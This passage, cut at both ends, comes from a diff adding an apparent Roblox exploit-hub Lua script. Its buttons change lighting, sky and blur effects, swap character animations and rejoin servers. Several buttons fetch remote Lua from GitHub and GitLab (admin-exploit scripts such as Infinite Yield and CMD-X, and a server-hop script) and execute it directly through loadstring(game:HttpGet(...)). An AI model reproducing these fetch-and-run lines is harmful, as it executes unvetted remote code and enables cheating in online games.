+L.ColorShift_Top = Color3.fromRGB(240, 127, 14)
+L.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
+L.ClockTime = 6.7
+L.FogColor = Color3.fromRGB(94, 76, 106)
+L.FogEnd = 1000
+L.FogStart = 0
+L.ExposureCompensation = 0.24
+L.ShadowSoftness = 0
+L.Ambient = Color3.fromRGB(59, 33, 27)
+
+local Bloom = Instance.new("BloomEffect")
+Bloom.Intensity = 0.1
+Bloom.Threshold = 0
+Bloom.Size = 100
+
+local Tropic = Instance.new("Sky")
+Tropic.Name = "Tropic"
+Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
+Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
+Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
+Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
+Tropic.StarCount = 100
+Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
+Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
+Tropic.Parent = Bloom
+
+local Sky = Instance.new("Sky")
+Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
+Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
+Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
+Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
+Sky.CelestialBodiesShown = false
+Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
+Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
+Sky.Parent = Bloom
+
+Bloom.Parent = game:GetService("Lighting")
+
+local Bloom = Instance.new("BloomEffect")
+Bloom.Enabled = false
+Bloom.Intensity = 0.35
+Bloom.Threshold = 0.2
+Bloom.Size = 56
+
+local Tropic = Instance.new("Sky")
+Tropic.Name = "Tropic"
+Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
+Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
+Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
+Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
+Tropic.StarCount = 100
+Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
+Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
+Tropic.Parent = Bloom
+
+local Sky = Instance.new("Sky")
+Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
+Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
+Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
+Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
+Sky.CelestialBodiesShown = false
+Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
+Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
+Sky.Parent = Bloom
+
+Bloom.Parent = game:GetService("Lighting")
+local Blur = Instance.new("BlurEffect")
+Blur.Size = 2
+
+Blur.Parent = game:GetService("Lighting")
+local Efecto = Instance.new("BlurEffect")
+Efecto.Name = "Efecto"
+Efecto.Enabled = false
+Efecto.Size = 2
+
+Efecto.Parent = game:GetService("Lighting")
+local Inaritaisha = Instance.new("ColorCorrectionEffect")
+Inaritaisha.Name = "Inari taisha"
+Inaritaisha.Saturation = 0.05
+Inaritaisha.TintColor = Color3.fromRGB(255, 224, 219)
+
+Inaritaisha.Parent = game:GetService("Lighting")
+local Normal = Instance.new("ColorCorrectionEffect")
+Normal.Name = "Normal"
+Normal.Enabled = false
+Normal.Saturation = -0.2
+Normal.TintColor = Color3.fromRGB(255, 232, 215)
+
+Normal.Parent = game:GetService("Lighting")
+local SunRays = Instance.new("SunRaysEffect")
+SunRays.Intensity = 0.05
+
+SunRays.Parent = game:GetService("Lighting")
+local Sunset = Instance.new("Sky")
+Sunset.Name = "Sunset"
+Sunset.SkyboxUp = "rbxassetid://323493360"
+Sunset.SkyboxLf = "rbxassetid://323494252"
+Sunset.SkyboxBk = "rbxassetid://323494035"
+Sunset.SkyboxFt = "rbxassetid://323494130"
+Sunset.SkyboxDn = "rbxassetid://323494368"
+Sunset.SunAngularSize = 14
+Sunset.SkyboxRt = "rbxassetid://323494067"
+
+Sunset.Parent = game:GetService("Lighting")
+local Takayama = Instance.new("ColorCorrectionEffect")
+Takayama.Name = "Takayama"
+Takayama.Enabled = false
+Takayama.Saturation = -0.3
+Takayama.Contrast = 0.1
+Takayama.TintColor = Color3.fromRGB(235, 214, 204)
+
+Takayama.Parent = game:GetService("Lighting")
+local L = game:GetService("Lighting")
+L.Brightness = 2.14
+L.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
+L.ColorShift_Top = Color3.fromRGB(240, 127, 14)
+L.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
+L.ClockTime = 6.7
+L.FogColor = Color3.fromRGB(94, 76, 106)
+L.FogEnd = 1000
+L.FogStart = 0
+L.ExposureCompensation = 0.24
+L.ShadowSoftness = 0
+L.Ambient = Color3.fromRGB(59, 33, 27)
+end)
+
+local button = tab:CreateButton("Rain", function()
+   local Vignette = true
+
+local Lighting = game:GetService("Lighting")
+local StarterGui = game:GetService("StarterGui")
+local Bloom = Instance.new("BloomEffect")
+local Blur = Instance.new("BlurEffect")
+local ColorCor = Instance.new("ColorCorrectionEffect")
+local SunRays = Instance.new("SunRaysEffect")
+local Sky = Instance.new("Sky")
+local Atm = Instance.new("Atmosphere")
+
+
+for i, v in pairs(Lighting:GetChildren()) do
+	if v then
+		v:Destroy()
+	end
+end
+
+Bloom.Parent = Lighting
+Blur.Parent = Lighting
+ColorCor.Parent = Lighting
+SunRays.Parent = Lighting
+Sky.Parent = Lighting
+Atm.Parent = Lighting
+
+if Vignette == true then
+	local Gui = Instance.new("ScreenGui")
+	Gui.Parent = StarterGui
+	Gui.IgnoreGuiInset = true
+	
+	local ShadowFrame = Instance.new("ImageLabel")
+	ShadowFrame.Parent = Gui
+	ShadowFrame.AnchorPoint = Vector2.new(0.5,1)
+	ShadowFrame.Position = UDim2.new(0.5,0,1,0)
+	ShadowFrame.Size = UDim2.new(1,0,1.05,0)
+	ShadowFrame.BackgroundTransparency = 1
+	ShadowFrame.Image = "rbxassetid://4576475446"
+	ShadowFrame.ImageTransparency = 0.3
+	ShadowFrame.ZIndex = 10
+end
+
+Bloom.Intensity = 0.3
+Bloom.Size = 10
+Bloom.Threshold = 0.8
+
+Blur.Size = 5
+
+ColorCor.Brightness = 0.1
+ColorCor.Contrast = 0.5
+ColorCor.Saturation = -0.3
+ColorCor.TintColor = Color3.fromRGB(255, 235, 203)
+
+SunRays.Intensity = 0.075
+SunRays.Spread = 0.727
+
+Sky.SkyboxBk = "http://www.roblox.com/asset/?id=4498828382"
+Sky.SkyboxDn = "http://www.roblox.com/asset/?id=4498828812"
+Sky.SkyboxFt = "http://www.roblox.com/asset/?id=4498829917"
+Sky.SkyboxLf = "http://www.roblox.com/asset/?id=4498830911"
+Sky.SkyboxRt = "http://www.roblox.com/asset/?id=4498830417"
+Sky.SkyboxUp = "http://www.roblox.com/asset/?id=4498831746"
+Sky.SunAngularSize = 0
+
+Lighting.Ambient = Color3.fromRGB(109, 110, 108)
+Lighting.Brightness = 0.13
+Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
+Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
+Lighting.EnvironmentDiffuseScale = 0.2
+Lighting.EnvironmentSpecularScale = 0.2
+Lighting.GlobalShadows = true
+Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
+Lighting.ShadowSoftness = 0.3
+Lighting.ClockTime = 15
+Lighting.GeographicLatitude = 45
+Lighting.ExposureCompensation = 0.5
+
+Atm.Density = 0.564
+Atm.Offset = 0.556
+Atm.Color = Color3.fromRGB(161, 165, 162)
+Atm.Decay = Color3.fromRGB(161, 165, 162)
+Atm.Glare = 0.36
+Atm.Haze = 1.72
+end)
+
+local button = tab:CreateButton("day-evening", function()
+   getgenv().mode = "Summer" -- Choose from Summer and Autumn
+
+
+
+
+local a = game.Lighting
+a.Ambient = Color3.fromRGB(33, 33, 33)
+a.Brightness = 0.4
+a.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+a.ColorShift_Top = Color3.fromRGB(255, 247, 237)
+a.EnvironmentDiffuseScale = 0.105
+a.EnvironmentSpecularScale = 0.522
+a.GlobalShadows = true
+a.OutdoorAmbient = Color3.fromRGB(51, 54, 67)
+a.ShadowSoftness = 0
+a.GeographicLatitude = -0
+a.ExposureCompensation = 0
+local b = Instance.new("BloomEffect", a)
+b.Enabled = true
+b.Intensity = 0.04
+b.Size = 1900
+b.Threshold = 0.915
+local c = Instance.new("ColorCorrectionEffect", a)
+c.Brightness = 0.176
+c.Contrast = 0.39
+c.Enabled = true
+c.Saturation = 0.2
+c.TintColor = Color3.fromRGB(217, 145, 57)
+if getgenv().mode == "Summer" then
+   c.TintColor = Color3.fromRGB(255, 220, 148)
+elseif getgenv().mode == "Autumn" then
+   c.TintColor = Color3.fromRGB(217, 145, 57)
+else
+   warn("No mode selected!")
+   print("Please select a mode")
+   b:Destroy()
+   c:Destroy()
+end
+local d = Instance.new("DepthOfFieldEffect", a)
+d.Enabled = true
+d.FarIntensity = 0.077
+d.FocusDistance = 21.54
+d.InFocusRadius = 20.77
+d.NearIntensity = 0.277
+local e = Instance.new("ColorCorrectionEffect", a)
+e.Brightness = 0
+e.Contrast = -0.07
+e.Saturation = 0
+e.Enabled = true
+e.TintColor = Color3.fromRGB(255, 247, 239)
+local e2 = Instance.new("ColorCorrectionEffect", a)
+e2.Brightness = 0.2
+e2.Contrast = 0.45
+e2.Saturation = -0.1
+e2.Enabled = true
+e2.TintColor = Color3.fromRGB(255, 255, 255)
+local s = Instance.new("SunRaysEffect", a)
+s.Enabled = true
+s.Intensity = 0.01
+s.Spread = 0.146
+
+local camera = workspace.CurrentCamera
+local blurAmount = 10
+local blurAmplifier = 5
+local lastVector = camera.CFrame.LookVector
+
+local motionBlur = Instance.new("BlurEffect", camera)
+
+local runService = game:GetService("RunService")
+
+workspace.Changed:Connect(function(property)
+ if property == "CurrentCamera" then
+  print("Changed")
+  local camera = workspace.CurrentCamera
+  if motionBlur and motionBlur.Parent then
+   motionBlur.Parent = camera
+  else
+   motionBlur = Instance.new("BlurEffect", camera)
+  end
+ end
+end)
+
+runService.Heartbeat:Connect(function()
+ if not motionBlur or motionBlur.Parent == nil then
+  motionBlur = Instance.new("BlurEffect", camera)
+ end
+ 
+ local magnitude = (camera.CFrame.LookVector - lastVector).magnitude
+ motionBlur.Size = math.abs(magnitude)*blurAmount*blurAmplifier/2
+ lastVector = camera.CFrame.LookVector
+end)
+end)
+
+local button = tab:CreateButton("Nigh", function()
+    game.Lighting.ClockTime = 24
+
+local Lighting = game:GetService("Lighting")
+local StarterGui = game:GetService("StarterGui")
+local Bloom = Instance.new("BloomEffect")
+local Blur = Instance.new("BlurEffect")
+local ColorCor = Instance.new("ColorCorrectionEffect")
+local SunRays = Instance.new("SunRaysEffect")
+local Sky = Instance.new("Sky")
+local Atm = Instance.new("Atmosphere")
+local Gui = Instance.new("ScreenGui")
+local ShadowFrame = Instance.new("ImageLabel")
+
+for i, v in pairs(Lighting:GetChildren()) do
+	if v then
+		v:Destroy()
+	end
+end
+
+Bloom.Parent = Lighting
+Blur.Parent = Lighting
+ColorCor.Parent = Lighting
+SunRays.Parent = Lighting
+Sky.Parent = Lighting
+Atm.Parent = Lighting
+Gui.Parent = StarterGui
+ShadowFrame.Parent = Gui
+
+Bloom.Intensity = 0.05
+Bloom.Size = 17
+Bloom.Threshold = 0.1
+
+Blur.Size = 2
+
+ColorCor.Brightness = 0.2
+ColorCor.Contrast = 0.9
+ColorCor.Saturation = 0.2
+ColorCor.TintColor = Color3.fromRGB(255, 235, 203)
+
+SunRays.Intensity = 0.08
+SunRays.Spread = 0.728
+
+
+Sky.SunAngularSize = 21
+
+Lighting.Ambient = Color3.fromRGB(106,106,106)
+Lighting.Brightness = 0.4
+Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
+Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
+Lighting.EnvironmentDiffuseScale = 0.2
+Lighting.EnvironmentSpecularScale = 0.2
+Lighting.GlobalShadows = true
+Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
+Lighting.ShadowSoftness = 0
+--day and night cycle
+
+Lighting.GeographicLatitude = 45
+Lighting.ExposureCompensation = 0.5
+
+Atm.Density = 0.364
+Atm.Offset = 0.556
+Atm.Color = Color3.fromRGB(199, 175, 166)
+Atm.Decay = Color3.fromRGB(44, 39, 33)
+Atm.Glare = 0.45
+Atm.Haze = 1.72
+
+ShadowFrame.AnchorPoint = Vector2.new(0.5,1)
+ShadowFrame.Position = UDim2.new(0.5,0,1,0)
+ShadowFrame.Size = UDim2.new(1,0,1.05,0)
+ShadowFrame.BackgroundTransparency = 1
+ShadowFrame.Image = "rbxassetid://4576475446"
+ShadowFrame.ImageTransparency = 0.3
+end)
+
+local tab = window:CreateTab("Admin/hub")
+
+local button = tab:CreateButton("Admin iv", function()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/BloodyBurns/Hex/main/Iv%20Admin%20v2.lua'))()
+   end)
+
+local button = tab:CreateButton("Infinite/Yield", function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+   end)
+
+local button = tab:CreateButton("CMD-X", function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
+   end)
+
+local button = tab:CreateButton("Nameless/Admin", function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
+   end)
+
+local tab = window:CreateTab("Rejoin/etc")
+
+local button = tab:CreateButton("Rejoin", function()
+   local notifSound = Instance.new("Sound",workspace)
+        notifSound.PlaybackSpeed = 1
+        notifSound.Volume = 0.15
+        notifSound.SoundId = "rbxassetid://876800936"
+        notifSound.PlayOnRemove = true
+        notifSound:Destroy()
+        local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(143.932, 50.5, -217.049)
+
+        local TeleportService = game:GetService("TeleportService")
+        local ts = game:GetService("TeleportService")
+local p = game:GetService("Players").LocalPlayer
+ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
+end)
+
+local button = tab:CreateButton("Server/Hot", function()
+    local notifSound = Instance.new("Sound",workspace)
+        notifSound.PlaybackSpeed = 1
+        notifSound.Volume = 0.15
+        notifSound.SoundId = "rbxassetid://876800936"
+        notifSound.PlayOnRemove = true
+        notifSound:Destroy()
+
+        local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(143.932, 22.5, -217.049)
+
+        loadstring(game:HttpGet('https://gitlab.com/ivanovpogorely/2323313frrf/-/raw/main/hop.lua'))()
+    end)
+
+local tab = window:CreateTab("Animations")
+
+local button = tab:CreateButton("Toy", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921159222"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Zombie", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Astronaut", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Bubbly", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Cartoony", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Elder", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Knight", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Levitation", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Mage", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Ninja", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Pirate", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Superhero", function()
+    local tomtoediendo = game.Players.LocalPlayer.Character
+tomtoediendo:FindFirstChild("Animate").Disabled = true 
+for i,v in pairs(tomtoediendo.Humanoid:GetPlayingAnimationTracks()) do 
+v:Stop() 
+end
+tomtoediendo.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
+tomtoediendo.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
+tomtoediendo.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
+tomtoediendo.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
+tomtoediendo.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
+tomtoediendo.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
+tomtoediendo.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
+tomtoediendo.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
+tomtoediendo.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
+tomtoediendo:FindFirstChild("Animate").Disabled = false
+end)
+
+local button = tab:CreateButton("Stylish", function()
